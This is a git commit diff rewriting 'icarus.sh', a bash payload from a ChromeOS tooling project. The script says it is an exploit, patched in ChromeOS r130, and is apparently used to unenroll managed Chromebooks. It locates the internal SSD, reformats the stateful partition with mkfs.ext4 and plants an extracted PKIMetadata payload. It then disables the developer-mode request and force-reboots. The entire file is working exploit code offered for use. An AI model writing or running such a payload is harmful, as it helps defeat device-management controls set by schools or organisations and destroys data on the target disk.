9c2bcc2066ddb4413f1b04275078c637ac341169
BinBashBanana <51469593+BinBashBanana@users.noreply.github.com>
2025-04-17 22:11:11 -0700

    fix icarus payload

--- wax/payloads/icarus.sh
+++ wax/payloads/icarus.sh
@@ -1,52 +1,93 @@
 #!/bin/bash
+# icarus by writable, WIP entry rewrite by OlyB
 
-[ "$EUID" -ne 0 ] && fail "Not running as root, this shouldn't happen! Failing."
+set -eE
+
+SCRIPT_DATE="[2025-04-17]"
+PAYLOAD=icarus.tar.gz
 
 fail() {
-    printf "%b\n" "$*" >&2 || :
-    sleep 1d
+	printf "%b\n" "$*" >&2
+	exit 1
 }
 
 get_largest_cros_blockdev() {
-    local largest size dev_name tmp_size remo
-    size=0
-    for blockdev in /sys/block/*; do
-        dev_name="${blockdev##*/}"
-        echo -e "$dev_name" | grep -q '^\(loop\|ram\)' && continue
-        tmp_size=$(cat "$blockdev"/size)
-        remo=$(cat "$blockdev"/removable)
-        if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
-            case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
-                *'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
-                    largest="/dev/$dev_name"
-                    size="$tmp_size"
-                    ;;
-            esac
-        fi
-    done
-    echo -e "$largest"
+	local largest size dev_name tmp_size remo
+	size=0
+	for blockdev in /sys/block/*; do
+		dev_name="${blockdev##*/}"
+		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
+		tmp_size=$(cat "$blockdev"/size)
+		remo=$(cat "$blockdev"/removable)
+		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
+			case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
+				*'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
+					largest="/dev/$dev_name"
+					size="$tmp_size"
+					;;
+			esac
+		fi
+	done
+	echo "$largest"
 }
 
 format_part_number() {
-    echo -n "$1"
-    echo "$1" | grep -q '[0-9]$' && echo -n p
-    echo "$2"
+	echo -n "$1"
+	echo "$1" | grep -q '[0-9]$' && echo -n p
+	echo "$2"
 }
 
-mount /dev/disk/by-label/STATE /mnt/stateful_partition/
-cros_dev="$(get_largest_cros_blockdev)"
-if [ -z "$cros_dev" ]; then
-    echo "No CrOS SSD found on device. Failing."
-    sleep 1d
-fi
-stateful=$(format_part_number "$cros_dev" 1)
-mkfs.ext4 -F "$stateful" || fail "Failed to wipe stateful." # This only wipes the stateful partition 
-mount "$stateful" /tmp || fail "Failed to mount stateful."
-mkdir -p /tmp/unencrypted/PKIMetadata
-cp /payloads/PKIMetadata /tmp/unencrypted/ -rvf
-chown 1000 /tmp/unencrypted/PKIMetadata -R
-rm /tmp/.developer_mode
-umount /tmp
-crossystem disable_dev_request=1 || fail "Failed to set disable_dev_request."
-read -p "Finished! Press enter to reboot."
-reboot
+cleanup() {
+	umount "$STATEFUL_MNT" || :
+}
+
+[ -f "$PAYLOAD" ] || fail "$PAYLOAD not found!"
+
+CROS_DEV="$(get_largest_cros_blockdev)"
+[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"
+
+TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
+[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"
+
+clear
+echo "Welcome to Icarus."
+echo "Script date: ${SCRIPT_DATE}"
+echo ""
+echo "Cert: fanqyxl (README: https://github.com/fanqyxl/icarus)"
+echo ""
+echo "This will destroy all data on ${TARGET_PART}."
+echo "Additional steps are needed to unenroll; see above link."
+echo "Note that this exploit is patched in ChromeOS r130."
+echo "Continue? (y/N)"
+read -r action
+case "$action" in
+	[yY]) : ;;
+	*) fail "Abort." ;;
+esac
+
+trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
+trap 'cleanup; exit' EXIT
+trap 'echo Abort.; cleanup; exit' INT
+
+echo "Wiping and mounting stateful"
+mkfs.ext4 -F -b 4096 -L H-STATE "$TARGET_PART" >/dev/null 2>&1
+STATEFUL_MNT=$(mktemp -d)
+mkdir -p "$STATEFUL_MNT"
+mount "$TARGET_PART" "$STATEFUL_MNT"
+
+mkdir -p "$STATEFUL_MNT"/unencrypted/PKIMetadata
+
+echo -n "Extracting"
+tar -xf "$PAYLOAD" -C "$STATEFUL_MNT"/unencrypted/PKIMetadata --checkpoint=.100
+echo ""
+
+echo "Cleaning up"
+cleanup
+
+crossystem disable_dev_request=1 || :
+crossystem disable_dev_request=1 # grunt weirdness
+
+echo "Finished! Press enter to reboot."
+read -rs
+reboot -f
+sleep infinity
